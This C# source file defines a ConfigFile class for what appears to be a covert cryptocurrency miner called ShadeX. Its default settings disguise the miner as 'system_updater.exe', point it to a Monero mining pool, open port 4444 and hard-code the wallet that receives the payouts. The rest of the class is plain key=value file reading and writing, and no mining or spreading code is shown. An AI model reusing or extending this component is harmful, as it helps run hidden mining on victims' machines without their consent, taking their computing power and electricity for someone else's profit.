using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;

namespace ShadeX_Core
{
    public class ConfigFile
    {
        private string file;

        /* DEFAULT CONFIG FILE */
        private string[] DEFAULT_CONFIG_FILE = new string[] {
            "device_id=",
            "miner_file=system_updater.exe",
            "port=4444",
            "pool_adress=pool.minexmr.com:443",
            "wallet_adress=45QNrDDCXPAdh87hS8FuXKKdXkxS3p8kg5GjWY5hfhk3F3RcuTKkowiLPdkjujUUeHibzCo1RribBiGC9xKvfFLR4fLeKGr",
            "opencl=0",
            "cuda=0"
        };

        public ConfigFile(string file)
        {
            this.file = file;

            if(!File.Exists(file))
            {
                File.WriteAllLines(file,DEFAULT_CONFIG_FILE);
            }
        }

        /* UPDATE LOCAL CONFIG FILE */
        public void Update(string[] fileContent)
        {
            File.WriteAllLines(file, fileContent);
        }

        /* UPDATE LOCAL CONFI FILE VALUE */
        public void Update(string name,string value)
        {
            List<string> newFile = new List<string>();

            foreach(string line in File.ReadAllLines(file))
            {
                string[] splitedLine = line.Split('=');

                if(splitedLine[0] == name) 
                {
                    newFile.Add(name + "=" + value);
                }
                else
                {
                    newFile.Add(line);
                }
            }

            Update(newFile.ToArray());
        }

        /* GET VALUE FROM COFIG FILE */
        public string GetValue(string name)
        {
            string[] data = File.ReadAllLines(file);

            foreach(string line in data)
            {
                string[] splitedLine = line.Split('=');
                if(splitedLine[0] == name)
                {
                    return splitedLine[1];
                }
            }
            return string.Empty;
        }
    }
}